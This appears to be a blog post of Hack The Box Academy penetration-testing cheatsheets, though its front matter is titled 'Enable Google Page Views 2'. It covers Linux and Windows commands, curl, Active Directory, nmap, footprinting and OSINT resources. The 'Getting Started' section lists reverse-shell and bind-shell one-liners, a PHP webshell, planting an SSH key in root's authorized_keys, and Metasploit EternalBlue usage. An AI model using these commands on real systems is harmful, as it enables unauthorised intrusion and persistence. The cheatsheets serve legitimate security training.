---
title: Enable Google Page Views 2
author: x4sh3s
date: 2022-01-03 18:32:00 -0500
categories: [Blogging, Tutorial]
tags: [google analytics, pageviews]
---


## 📦 HTB  | Academy


### Cheatsheet

| **Command** | **Description** |
| --------------|-------------------|
|`uname -a`|  Shows the current kernel and OS information |
|`sudo <command>`| Executes the command as root (Administrator) |


# Pre-Engagement

## 01. Learning Process
## Penetration Testing Process
## Setting Up
## 02. Linux Fundamentals

### Cheatsheet

| **Command** | **Description** |
| --------------|-------------------|
| `man <tool>` | Opens man pages for the specified tool. | 
| `<tool> -h` | Prints the help page of the tool. | 
| `apropos <keyword>` | Searches through man pages' descriptions for instances of a given keyword. | 
| `cat` | Concatenate and print files. |
| `whoami` | Displays current username. | 
| `id` | Returns users identity. | 
| `hostname` | Sets or prints the name of the current host system. | 
| `uname` | Prints operating system name. | 
| `pwd` | Returns working directory name. | 
| `ifconfig` | The `ifconfig` utility is used to assign or view an address to a network interface and/or configure network interface parameters. | 
| `ip` | Ip is a utility to show or manipulate routing, network devices, interfaces, and tunnels. | 
| `netstat` | Shows network status. | 
| `ss` | Another utility to investigate sockets. | 
| `ps` | Shows process status. | 
| `who` | Displays who is logged in. | 
| `env` | Prints environment or sets and executes a command. | 
| `lsblk` | Lists block devices. | 
| `lsusb` | Lists USB devices. | 
| `lsof` | Lists opened files. | 
| `lspci` | Lists PCI devices. | 
| `sudo` | Execute command as a different user. | 
| `su` | The `su` utility requests appropriate user credentials via PAM and switches to that user ID (the default user is the superuser).  A shell is then executed. | 
| `useradd` | Creates a new user or update default new user information. | 
| `userdel` | Deletes a user account and related files. |
| `usermod` | Modifies a user account. | 
| `addgroup` | Adds a group to the system. | 
| `delgroup` | Removes a group from the system. | 
| `passwd` | Changes user password. |
| `dpkg` | Install, remove and configure Debian-based packages. | 
| `apt` | High-level package management command-line utility. | 
| `aptitude` | Alternative to `apt`. | 
| `snap` | Install, remove and configure snap packages. |
| `gem` | Standard package manager for Ruby. | 
| `pip` | Standard package manager for Python. | 
| `git` | Revision control system command-line utility. | 
| `systemctl` | Command-line based service and systemd control manager. |
| `ps` | Prints a snapshot of the current processes. | 
| `journalctl` | Query the systemd journal. | 
| `kill` | Sends a signal to a process. | 
| `bg` | Puts a process into background. |
| `jobs` | Lists all processes that are running in the background. | 
| `fg` | Puts a process into the foreground. | 
| `curl` | Command-line utility to transfer data from or to a server. | 
| `wget` | An alternative to `curl` that downloads files from FTP or HTTP(s) server. |
| `python3 -m http.server` | Starts a Python3 web server on TCP port 8000. | 
| `ls` | Lists directory contents. | 
| `cd` | Changes the directory. |
| `clear` | Clears the terminal. | 
| `touch` | Creates an empty file. |
| `mkdir` | Creates a directory. | 
| `tree` | Lists the contents of a directory recursively. |
| `mv` | Move or rename files or directories. | 
| `cp` | Copy files or directories. |
| `nano` | Terminal based text editor. | 
| `which` | Returns the path to a file or link. |
| `find` | Searches for files in a directory hierarchy. | 
| `updatedb` | Updates the locale database for existing contents on the system. |
| `locate` | Uses the locale database to find contents on the system. | 
| `more` | Pager that is used to read STDOUT or files. |
| `less` | An alternative to `more` with more features. | 
| `head` | Prints the first ten lines of STDOUT or a file. |
| `tail` | Prints the last ten lines of STDOUT or a file. | 
| `sort` | Sorts the contents of STDOUT or a file. |
| `grep` | Searches for specific results that contain given patterns. | 
| `cut` | Removes sections from each line of files. |
| `tr` | Replaces certain characters. | 
| `column` | Command-line based utility that formats its input into multiple columns. |
| `awk` | Pattern scanning and processing language. |
| `sed` | A stream editor for filtering and transforming text. | 
| `wc` | Prints newline, word, and byte counts for a given input. |
| `chmod` | Changes permission of a file or directory. |
| `chown` | Changes the owner and group of a file or directory. |


## 03. Windows Fundamentals

### Cheatsheet

| **Command** | **Description** |
| --------------|-------------------|
| `xfreerdp /v:<target IP address> /u:htb-student /p:<password>` | RDP to lab target |
| `Get-WmiObject -Class win32_OperatingSystem` | Get information about the operating system |
| `dir c:\ /a` | View all files and directories in the c:\ root directory |
| `tree <directory>` | Graphically displaying the directory structure of a path |
| `tree c:\ /f \| more` | Walk through results of the `tree` command page by page |
| `icacls <directory>` | View the permissions set on a directory |
| `icacls c:\users /grant joe:f` | Grant a user full permissions to a directory |
| `icacls c:\users /remove joe` | Remove a users' permissions on a directory |
| `Get-Service` | `PowerShell` cmdlet to view running services |
| `help <command>` | Display the help menu for a specific command |
| `get-alias` | List `PowerShell` aliases |
| `New-Alias -Name "Show-Files" Get-ChildItem` | Create a new `PowerShell` alias |
| `Get-Module \| select Name,ExportedCommands \| fl` | View imported `PowerShell` modules and their associated commands |
| `Get-ExecutionPolicy -List` | View the `PowerShell` execution policy |
| `Set-ExecutionPolicy Bypass -Scope Process` | Set the `PowerShell` execution policy to bypass for the current session |
| `wmic os list brief` | Get information about the operating system with `wmic` |
| `Invoke-WmiMethod` | Call methods of `WMI` objects |
| `whoami /user` | View the current users' SID |
| `reg query <key>` | View information about a registry key |
| `Get-MpComputerStatus` | Check which `Defender` protection settings are enabled |
| `sconfig` | Load Server Configuration menu in Windows Server Core |


## 04. Introduction to Networking
## 05. Web Requests

### Cheatsheet

#### cURL

| **Command** | **Description** |
| --------------|-------------------|
| `curl -h` | cURL help menu |
| `curl inlanefreight.com` | Basic GET request |
| `curl -s -O inlanefreight.com/index.html` | Download file |
| `curl -k https://inlanefreight.com` | Skip HTTPS (SSL) certificate validation |
| `curl inlanefreight.com -v` | Print full HTTP request/response details |
| `curl -I https://www.inlanefreight.com` | Send HEAD request (only prints response headers) |
| `curl -i https://www.inlanefreight.com` | Print response headers and response body |
| `curl https://www.inlanefreight.com -A 'Mozilla/5.0'` | Set User-Agent header |
| `curl -u admin:admin http://<SERVER_IP>:<PORT>/` | Set HTTP basic authorization credentials |
| `curl  http://admin:admin@<SERVER_IP>:<PORT>/` | Pass HTTP basic authorization credentials in the URL |
| `curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://<SERVER_IP>:<PORT>/` | Set request header |
| `curl 'http://<SERVER_IP>:<PORT>/search.php?search=le'` | Pass GET parameters |
| `curl -X POST -d 'username=admin&password=admin' http://<SERVER_IP>:<PORT>/` | Send POST request with POST data |
| `curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://<SERVER_IP>:<PORT>/` | Set request cookies |
| `curl -X POST -d '{"search":"london"}' -H 'Content-Type: application/json' http://<SERVER_IP>:<PORT>/search.php` | Send POST request with JSON data |

#### APIs
| **Command** | **Description** |
| --------------|-------------------|
| `curl http://<SERVER_IP>:<PORT>/api.php/city/london` | Read entry |
| `curl -s http://<SERVER_IP>:<PORT>/api.php/city/ \| jq` | Read all entries |
| `curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'` | Create (add) entry |
| `curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london -d '{"city_name":"New_HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'` | Update (modify) entry |
| `curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City` | Delete entry |

#### Browser DevTools

| **Shortcut** | **Description** |
| --------------|-------------------|
| [`CTRL+SHIFT+I`] or [`F12`] | Show devtools |
| [`CTRL+SHIFT+E`] | Show Network tab |
| [`CTRL+SHIFT+K`] | Show Console tab |


## 06. Introduction to Web Applications
## 07. JavaScript Deobfuscation

### Cheatsheet

#### Commands

| **Command**   | **Description**   |
| --------------|-------------------|
| `curl http:/SERVER_IP:PORT/` | cURL GET request |
| `curl -s http:/SERVER_IP:PORT/ -X POST` | cURL POST request |
| `curl -s http:/SERVER_IP:PORT/ -X POST -d "param1=sample"` | cURL POST request with data |
| `echo hackthebox \| base64` | base64 encode |
| `echo ENCODED_B64 \| base64 -d` | base64 decode |
| `echo hackthebox \| xxd -p` | hex encode |
| `echo ENCODED_HEX \| xxd -p -r` | hex decode |
| `echo hackthebox \| tr 'A-Za-z' 'N-ZA-Mn-za-m'` | rot13 encode |
| `echo ENCODED_ROT13 \| tr 'A-Za-z' 'N-ZA-Mn-za-m'` | rot13 decode |

#### Deobfuscation Websites

| **Website** |
| ----------------------------------|
| [JS Console](https://jsconsole.com) |
| [Prettier](https://prettier.io/playground/) |
| [Beautifier](https://beautifier.io/) |
| [JSNice](http://www.jsnice.org/) |

#### Misc

| **Command**   | **Description**   |
| --------------|-------------------|
| `ctrl+u` | Show HTML source code in Firefox |


## Hacking Wordpress

### Cheatsheets

| **Command** | **Description** |
| --------------|-------------------|
|`tree -L 1`|  Lists contents of current directory |
|`curl -s -X GET <url>`| Makes a GET request to a webserver and receives HTML source code of requested web page |
|`curl -I -X GET <url>`| Prints the response header of the GET request from the requested web page |
|`curl -X POST -d <data> <url>`| Sends a POST request with data to specific webserver |
|`wpscan --url <url> -e ap`| Scans specific WordPress application to enumerate plugins |
|`wpscan --url <url> -e u`| Scans specific WordPress application to enumerate users |
|`msfconsole`| Starts Metasploit Framework |
|`html2text`|  Converts redirected HTML output or files to easily readable output |
|`grep <pattern>`| Filters specific pattern in files or redirected output |
|`jq`| Transforms JSON input and streams of JSON entities |
|`man <tool>`| Man provides you with the manpage of the specific tool |

## Introduction to Bash Scripting
## Intro to Network Traffic Analysis
## Secure Coding 101: JavaScript
## 08. Introduction to Active Directory

### Cheatsheet

#### Basic Commands Needed  

`xfreerdp /v:<IP> /u:<User> /p:<Password>`
`ping <IP>`

#### General Commands  

`Get-Module`
Returns a list of loaded PowerShell Modules.

`Get-Command -Module ActiveDirectory`
Lists commands for the module specified.

`Get-Help <cmd-let>`
Shows help syntax for the cmd-let specified.

`Import-Module ActiveDirectory`
Imports the Active Directory Module

#### Active Directory PowerShell Commands
 
##### AD User Commands  

`New-ADUser -Name "first last" -Accountpassword (Read-Host -AsSecureString "Super$ecurePassword!") -Enabled $true -OtherAttributes @{'title'="Analyst";'mail'="f.last@domain.com"}`
Add a user to AD and set attributes.

`Remove-ADUser -Identity <name>`
Removes a user from AD with the identity of 'name'.

`Unlock-ADAccount -Identity <name>`
Unlocks a user account with the identity of 'name'.

`Set-ADAccountPassword -Identity <'name'> -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "NewP@ssw0rdReset!" -Force)`
Set the password of an AD user to the password specified.

`Set-ADUser -Identity amasters -ChangePasswordAtLogon $true`
Force a user to change their password at next logon attempt.

##### AD Group Commands  

`New-ADOrganizationalUnit -Name "name" -Path "OU=folder,DC=domain,DC=local"`
Create a new AD OU container named "name" in the path specified.

`New-ADGroup -Name "name" -SamAccountName analysts -GroupCategory Security -GroupScope Global -DisplayName "Security Analysts" -Path "CN=Users,DC=domain,DC=local" -Description "Members of this group are Security Analysts under the IT OU"`
Create a new security group named "name" with the accompanying attributes.

`Add-ADGroupMember -Identity 'group name' -Members 'ACepheus,OStarchaser,ACallisto'`
Add an AD user to the group specified.

##### GPO Commands  

`Copy-GPO -SourceName "GPO to copy" -TargetName "Name"`
Copy a GPO for use as a new GPO with a target name of "name".

`Set-GPLink -Name "Security Analysts Control" -Target "ou=Security Analysts,ou=IT,OU=HQ-NYC,OU=Employees,OU=Corp,dc=INLANEFREIGHT,dc=LOCAL" -LinkEnabled Yes`
Link a GPO for use to a specific OU or security group.

#### Computer Commands  

`Add-Computer -DomainName 'INLANEFREIGHT.LOCAL' -Credential 'INLANEFREIGHT\HTB-student_adm' -Restart`
Add a new computer to the domain using the credentials specified.

`Add-Computer -ComputerName 'name' -LocalCredential '.\localuser' -DomainName 'INLANEFREIGHT.LOCAL' -Credential 'INLANEFREIGHT\htb-student_adm' -Restart`
Remotely add a computer to a domain.

`Get-ADComputer -Identity "name" -Properties * | select CN,CanonicalName,IPv4Address`
Check for a computer named "name" and view its properties.

#### References    

[Microsoft](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview)

## 09. Getting Started

### Cheatsheet

#### Basic Tools

| **Command**   | **Description**   |
| --------------|-------------------|
| **General** |
| `sudo openvpn user.ovpn` | Connect to VPN |
| `ifconfig`/`ip a` | Show our IP address |
| `netstat -rn` | Show networks accessible via the VPN |
| `ssh user@10.10.10.10` | SSH to a remote server |
| `ftp 10.129.42.253` | FTP to a remote server |
| **tmux** |
| `tmux` | Start tmux |
| `ctrl+b` | tmux: default prefix |
| `prefix c` | tmux: new window |
| `prefix 1` | tmux: switch to window (`1`) |
| `prefix shift+%` | tmux: split pane vertically |
| `prefix shift+"` | tmux: split pane horizontally |
| `prefix ->` | tmux: switch to the right pane |
| **Vim** |
| `vim file` | vim: open `file` with vim |
| `esc+i` | vim: enter `insert` mode |
| `esc` | vim: back to `normal` mode |
| `x` | vim: Cut character |
| `dw` | vim: Cut word |
| `dd` | vim: Cut full line |
| `yw` | vim: Copy word |
| `yy` | vim: Copy full line |
| `p` | vim: Paste |
| `:1` | vim: Go to line number 1. |
| `:w` | vim: Write the file 'i.e. save' |
| `:q` | vim: Quit |
| `:q!` | vim: Quit without saving |
| `:wq` | vim: Write and quit |

#### Pentesting
| **Command**   | **Description**   |
| --------------|-------------------|
| **Service Scanning** |
| `nmap 10.129.42.253` | Run nmap on an IP |
| `nmap -sV -sC -p- 10.129.42.253` | Run an nmap script scan on an IP |
| `locate scripts/citrix` | List various available nmap scripts |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40` | Run an nmap script on an IP |
| `netcat 10.10.10.10 22` | Grab banner of an open port |
| `smbclient -N -L \\\\10.129.42.253` | List SMB Shares |
| `smbclient \\\\10.129.42.253\\users` | Connect to an SMB share |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` | Scan SNMP on an IP |
| `onesixtyone -c dict.txt 10.129.42.254` | Brute force SNMP secret string |
| **Web Enumeration** |
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` | Run a directory scan on a website |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Run a sub-domain scan on a website |
| `curl -IL https://www.inlanefreight.com` | Grab website banner |
| `whatweb 10.10.10.121` | List details about the webserver/certificates |
| `curl 10.10.10.121/robots.txt` | List potential directories in `robots.txt` |
| `ctrl+U` | View page source (in Firefox) |
| **Public Exploits** |
| `searchsploit openssh 7.2` | Search for public exploits for a web application |
| `msfconsole` | MSF: Start the Metasploit Framework |
| `search exploit eternalblue` | MSF: Search for public exploits in MSF |
| `use exploit/windows/smb/ms17_010_psexec` | MSF: Start using an MSF module |
| `show options` | MSF: Show required options for an MSF module |
| `set RHOSTS 10.10.10.40` | MSF: Set a value for an MSF module option |
| `check` | MSF: Test if the target server is vulnerable |
| `exploit` | MSF: Run the exploit on the target server is vulnerable |
| **Using Shells** |
| `nc -lvnp 1234` | Start a `nc` listener on a local port |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` | Send a reverse shell from the remote server |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f` | Another command to send a reverse shell from the remote server |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f` | Start a bind shell on the remote server |
| `nc 10.10.10.1 1234` | Connect to a bind shell started on the remote server |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell TTY (1) |
| `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice | Upgrade shell TTY (2) |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` | Create a webshell php file |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id` | Execute a command on an uploaded webshell |
| **Privilege Escalation** |
| `./linpeas.sh` | Run `linpeas` script to enumerate remote server |
| `sudo -l` | List available `sudo` privileges |
| `sudo -u user /bin/echo Hello World!` | Run a command with `sudo` |
| `sudo su -` | Switch to root user (if we have access to `sudo su`) |
| `sudo su user -` | Switch to a user (if we have access to `sudo su`) |
| `ssh-keygen -f key` | Create a new SSH key |
| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys` | Add the generated public key to the user |
| `ssh root@10.10.10.10 -i key` | SSH to the server with the generated private key |
| **Transferring Files** |
| `python3 -m http.server 8000` | Start a local webserver |
| `wget http://10.10.14.1:8000/linpeas.sh` | Download a file on the remote server from our local machine |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | Download a file on the remote server from our local machine |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh` | Transfer a file to the remote server with `scp` (requires SSH access) |
| `base64 shell -w 0` | Convert a file to `base64` |
| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell` | Convert a file from `base64` back to its orig |
| `md5sum shell` | Check the file's `md5sum` to ensure it converted correctly |


# Information Gathering

## 10. Network Enumeration with Nmap

### Cheatsheet

#### Scanning Options

| **Nmap Option** | **Description** |
|---|----|
| `10.10.10.0/24` | Target network range. |
| `-sn` | Disables port scanning. |
| `-Pn` | Disables ICMP Echo Requests |
| `-n` | Disables DNS Resolution. |
| `-PE` | Performs the ping scan by using ICMP Echo Requests against the target. |
| `--packet-trace` | Shows all packets sent and received. |
| `--reason` | Displays the reason for a specific result. |
| `--disable-arp-ping` | Disables ARP Ping Requests. |
| `--top-ports=<num>` | Scans the specified top ports that have been defined as most frequent.  |
| `-p-` | Scan all ports. |
| `-p22-110` | Scan all ports between 22 and 110. |
| `-p22,25` | Scans only the specified ports 22 and 25. |
| `-F` | Scans top 100 ports. |
| `-sS` | Performs an TCP SYN-Scan. |
| `-sA` | Performs an TCP ACK-Scan. |
| `-sU` | Performs an UDP Scan. |
| `-sV` | Scans the discovered services for their versions. |
| `-sC` | Perform a Script Scan with scripts that are categorized as "default". |
| `--script <script>` | Performs a Script Scan by using the specified scripts. |
| `-O` | Performs an OS Detection Scan to determine the OS of the target. |
| `-A` | Performs OS Detection, Service Detection, and traceroute scans. |
| `-D RND:5` | Sets the number of random Decoys that will be used to scan the target. |
| `-e` | Specifies the network interface that is used for the scan. |
| `-S 10.10.10.200` | Specifies the source IP address for the scan. |
| `-g` | Specifies the source port for the scan. |
| `--dns-server <ns>` | DNS resolution is performed by using a specified name server. |

#### Output Options

| **Nmap Option** | **Description** |
|---|----|
| `-oA filename` | Stores the results in all available formats starting with the name of "filename". |
| `-oN filename` | Stores the results in normal format with the name "filename". |
| `-oG filename` | Stores the results in "grepable" format with the name of "filename". |
| `-oX filename` | Stores the results in XML format with the name of "filename". |

#### Performance Options

| **Nmap Option** | **Description** |
|---|----|
| `--max-retries <num>` | Sets the number of retries for scans of specific ports. |
| `--stats-every=5s` | Displays scan's status every 5 seconds. |
| `-v/-vv` | Displays verbose output during the scan. |
| `--initial-rtt-timeout 50ms` | Sets the specified time value as initial RTT timeout. |
| `--max-rtt-timeout 100ms` | Sets the specified time value as maximum RTT timeout. |
| `--min-rate 300` | Sets the number of packets that will be sent simultaneously. |
| `-T <0-5>` | Specifies the specific timing template. |

## DNS Enumeration Python
## 11. Footprinting

### Cheatsheet

#### Infrastructure-based Enumeration

|**Command**|**Description**|
|-|-|
| `curl -s https://crt.sh/\?q\=<target-domain>\&output\=json \| jq .` | Certificate transparency. |
| `for i in $(cat ip-addresses.txt);do shodan host $i;done` | Scan each IP address in a list using Shodan. |

#### Host-based Enumeration

#### FTP
|**Command**|**Description**|
|-|-|
| `ftp <FQDN/IP>` | Interact with the FTP service on the target. |
| `nc -nv <FQDN/IP> 21` | Interact with the FTP service on the target. |
| `telnet <FQDN/IP> 21` | Interact with the FTP service on the target. |
| `openssl s_client -connect <FQDN/IP>:21 -starttls ftp` | Interact with the FTP service on the target using encrypted connection. |
| `wget -m --no-passive ftp://anonymous:anonymous@<target>` | Download all available files on the target FTP server. |

#### SMB
|**Command**|**Description**|
|-|-|
| `smbclient -N -L //<FQDN/IP>` | Null session authentication on SMB. |
| `smbclient //<FQDN/IP>/<share>` | Connect to a specific SMB share. |
| `rpcclient -U "" <FQDN/IP>` | Interaction with the target using RPC. |
| `samrdump.py <FQDN/IP>` | Username enumeration using Impacket scripts. |
| `smbmap -H <FQDN/IP>` | Enumerating SMB shares. |
| `crackmapexec smb <FQDN/IP> --shares -u '' -p ''` | Enumerating SMB shares using null session authentication. |
| `enum4linux-ng.py <FQDN/IP> -A` | SMB enumeration using enum4linux. |

#### NFS
|**Command**|**Description**|
|-|-|
| `showmount -e <FQDN/IP>` | Show available NFS shares. |
| `mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock` | Mount the specific NFS share.umount ./target-NFS |
| `umount ./target-NFS` | Unmount the specific NFS share. |

#### DNS
|**Command**|**Description**|
|-|-|
| `dig ns <domain.tld> @<nameserver>` | NS request to the specific nameserver. |
| `dig any <domain.tld> @<nameserver>` | ANY request to the specific nameserver. |
| `dig axfr <domain.tld> @<nameserver>` | AXFR request to the specific nameserver. |
| `dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>` | Subdomain brute forcing. |

#### SMTP
|**Command**|**Description**|
|-|-|
| `telnet <FQDN/IP> 25` |  |

#### IMAP/POP3
|**Command**|**Description**|
|-|-|
| `curl -k 'imaps://<FQDN/IP>' --user <user>:<password>` | Log in to the IMAPS service using cURL. |
| `openssl s_client -connect <FQDN/IP>:imaps` | Connect to the IMAPS service. |
| `openssl s_client -connect <FQDN/IP>:pop3s` | Connect to the POP3s service. |

#### SNMP
|**Command**|**Description**|
|-|-|
| `snmpwalk -v2c -c <community string> <FQDN/IP>` | Querying OIDs using snmpwalk. |
| `onesixtyone -c community-strings.list <FQDN/IP>` | Bruteforcing community strings of the SNMP service. |
| `braa <community string>@<FQDN/IP>:.1.*` | Bruteforcing SNMP service OIDs. |

#### MySQL
|**Command**|**Description**|
|-|-|
| `mysql -u <user> -p<password> <FQDN/IP>` | Login to the MySQL server. |

#### MSSQL
|**Command**|**Description**|
|-|-|
| `mssqlclient.py <user>@<FQDN/IP> -windows-auth` | Log in to the MSSQL server using Windows authentication. |

#### IPMI
|**Command**|**Description**|
|-|-|
| `msf6 auxiliary(scanner/ipmi/ipmi_version)` | IPMI version detection. |
| `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)` | Dump IPMI hashes. |

#### Linux Remote Management
|**Command**|**Description**|
|-|-|
| `ssh-audit.py <FQDN/IP>` | Remote security audit against the target SSH service. |
| `ssh <user>@<FQDN/IP>` | Log in to the SSH server using the SSH client. |
| `ssh -i private.key <user>@<FQDN/IP>` | Log in to the SSH server using private key. |
| `ssh <user>@<FQDN/IP> -o PreferredAuthentications=password` | Enforce password-based authentication. |

#### Windows Remote Management
|**Command**|**Description**|
|-|-|
| `rdp-sec-check.pl <FQDN/IP>` | Check the security settings of the RDP service. |
| `xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP>` | Log in to the RDP server from Linux. |
| `evil-winrm -i <FQDN/IP> -u <user> -p <password>` | Log in to the WinRM server. |
| `wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"` | Execute command using the WMI service. |

## 12. Information Gathering - Web Edition

### Cheatsheet

#### WHOIS

| **Command** | **Description** |
|-|-|
| `export TARGET="domain.tld"` | Assign target to an environment variable. |
| `whois $TARGET` | WHOIS lookup for the target. |

#### DNS Enumeration

| **Command** | **Description** |
|-|-|
| `nslookup $TARGET` | Identify the `A` record for the target domain. |
| `nslookup -query=A $TARGET` | Identify the `A` record for the target domain. |
| `dig $TARGET @<nameserver/IP>` | Identify the `A` record for the target domain.  |
| `dig a $TARGET @<nameserver/IP>` | Identify the `A` record for the target domain.  |
| `nslookup -query=PTR <IP>` | Identify the `PTR` record for the target IP address. |
| `dig -x <IP> @<nameserver/IP>` | Identify the `PTR` record for the target IP address.  |
| `nslookup -query=ANY $TARGET` | Identify `ANY` records for the target domain. |
| `dig any $TARGET @<nameserver/IP>` | Identify `ANY` records for the target domain. |
| `nslookup -query=TXT $TARGET` | Identify the `TXT` records for the target domain. |
| `dig txt $TARGET @<nameserver/IP>` | Identify the `TXT` records for the target domain. |
| `nslookup -query=MX $TARGET` | Identify the `MX` records for the target domain. |
| `dig mx $TARGET @<nameserver/IP>` | Identify the `MX` records for the target domain. |

#### Passive Subdomain Enumeration

| **Resource/Command** | **Description** |
|-|-|
| `VirusTotal` | [https://www.virustotal.com/gui/home/url](https://www.virustotal.com/gui/home/url) |
| `Censys` | [https://censys.io/](https://censys.io/) |
| `Crt.sh` | [https://crt.sh/](https://crt.sh/) |
| `curl -s https://sonar.omnisint.io/subdomains/{domain} \| jq -r '.[]' \| sort -u` | All subdomains for a given domain. |
| `curl -s https://sonar.omnisint.io/tlds/{domain} \| jq -r '.[]' \| sort -u` | All TLDs found for a given domain. |
| `curl -s https://sonar.omnisint.io/all/{domain} \| jq -r '.[]' \| sort -u` | All results across all TLDs for a given domain. |
| `curl -s https://sonar.omnisint.io/reverse/{ip} \| jq -r '.[]' \| sort -u` | Reverse DNS lookup on IP address. |
| `curl -s https://sonar.omnisint.io/reverse/{ip}/{mask} \| jq -r '.[]' \| sort -u` | Reverse DNS lookup of a CIDR range. |
| `curl -s "https://crt.sh/?q=${TARGET}&output=json" \| jq -r '.[] \| "\(.name_value)\n\(.common_name)"' \| sort -u` | Certificate Transparency. |
| `cat sources.txt \| while read source; do theHarvester -d "${TARGET}" -b $source -f "${source}-${TARGET}";done` | Searching for subdomains and other information on the sources provided in the source.txt list. |

#### Sources.txt
```txt
baidu
bufferoverun
crtsh
hackertarget
otx
projecdiscovery
rapiddns
sublist3r
threatcrowd
trello
urlscan
vhost
virustotal
zoomeye
```

#### Passive Infrastructure Identification

| **Resource/Command** | **Description** |
|-|-|
| `Netcraft` | [https://www.netcraft.com/](https://www.netcraft.com/) |
| `WayBackMachine` | [http://web.archive.org/](http://web.archive.org/) |
| `WayBackURLs` | [https://github.com/tomnomnom/waybackurls](https://github.com/tomnomnom/waybackurls) |
| `waybackurls -dates https://$TARGET > waybackurls.txt` | Crawling URLs from a domain with the date it was obtained. |

#### Active Infrastructure Identification

| **Resource/Command** | **Description** |
|-|-|
| `curl -I "http://${TARGET}"` | Display HTTP headers of the target webserver. |
| `whatweb -a https://www.facebook.com -v` | Technology identification. |
| `Wappalyzer` | [https://www.wappalyzer.com/](https://www.wappalyzer.com/) |
| `wafw00f -v https://$TARGET` | WAF Fingerprinting. |
| `Aquatone` | [https://github.com/michenriksen/aquatone](https://github.com/michenriksen/aquatone) |
| `cat subdomain.list \| aquatone -out ./aquatone -screenshot-timeout 1000` | Makes screenshots of all subdomains in the subdomain.list. |

#### Active Subdomain Enumeration

| **Resource/Command** | **Description** |
|-|-|
| `HackerTarget` | [https://hackertarget.com/zone-transfer/](https://hackertarget.com/zone-transfer/) |
| `SecLists` | [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) |
| `nslookup -type=any -query=AXFR $TARGET nameserver.target.domain` | Zone Transfer using Nslookup against the target domain and its nameserver. |
| `gobuster dns -q -r "${NS}" -d "${TARGET}" -w "${WORDLIST}" -p ./patterns.txt -o "gobuster_${TARGET}.txt"` | Bruteforcing subdomains. |

#### Virtual Hosts

| **Resource/Command** | **Description** |
|-|-|
| `curl -s http://192.168.10.10 -H "Host: randomtarget.com"` | Changing the HOST HTTP header to request a specific domain. |
| `cat ./vhosts.list \| while read vhost;do echo "\n********\nFUZZING: ${vhost}\n********";curl -s -I http://<IP address> -H "HOST: ${vhost}.target.domain" \| grep "Content-Length: ";done` | Bruteforcing for possible virtual hosts on the target domain. |
| `ffuf -w ./vhosts -u http://<IP address> -H "HOST: FUZZ.target.domain" -fs 612` | Bruteforcing for possible virtual hosts on the target domain using `ffuf`. |

#### Crawling

| **Resource/Command** | **Description** |
|-|-|
| `ZAP` | [https://www.zaproxy.org/](https://www.zaproxy.org/) |
| `ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt` | Discovering files and folders that cannot be spotted by browsing the website.
| `ffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://www.target.domain/FOLDERS/WORDLISTEXTENSIONS` | Mutated bruteforcing against the target web server. |

## 13. OSINT: Corporate Recon

### Cheatsheet

|**Documentation**|
|-|
| [History Master](https://addons.mozilla.org/en-US/firefox/addon/history-master/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search) |
| [SingleFile](https://addons.mozilla.org/en-US/firefox/addon/single-file/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search) |

|**Company Information**|
|-|
| [https://www.google.com/maps/](https://www.google.com/maps/) |
| [https://earth.google.com](https://earth.google.com) |
| [https://showmystreet.com/](https://showmystreet.com/) |
| [https://www.xing.com](https://www.xing.com) |
| [https://www.monster.com/](https://www.monster.com/) |
| [https://indeed.com](https://indeed.com) |
| [https://www.glassdoor.de](https://www.glassdoor.de) |
| [https://www.trustpilot.com/](https://www.trustpilot.com/) |

|**Domain Information**|
|-|
| [https://crt.sh/](https://crt.sh/) |
| [CTFR.py](https://github.com/UnaPibaGeek/ctfr) |
| [https://certificate.transparency.dev/](https://certificate.transparency.dev/) |
| [ARIN Search](https://www.arin.net/resources/registry/whois/rws/cli/) |
| [https://mxtoolbox.com/](https://mxtoolbox.com/SuperTool.aspx) |
| [ICANN Lookup](https://lookup.icann.org/) |
| [https://dnsdumpster.com/](https://dnsdumpster.com/) |
| [GCP IP ranges](https://www.gstatic.com/ipranges/cloud.json) |
| [Azure IP ranges](https://www.microsoft.com/en-us/download/details.aspx?id=56519) |
| [DigitalOcean IP Ranges](https://www.digitalocean.com/docs/spaces/) |
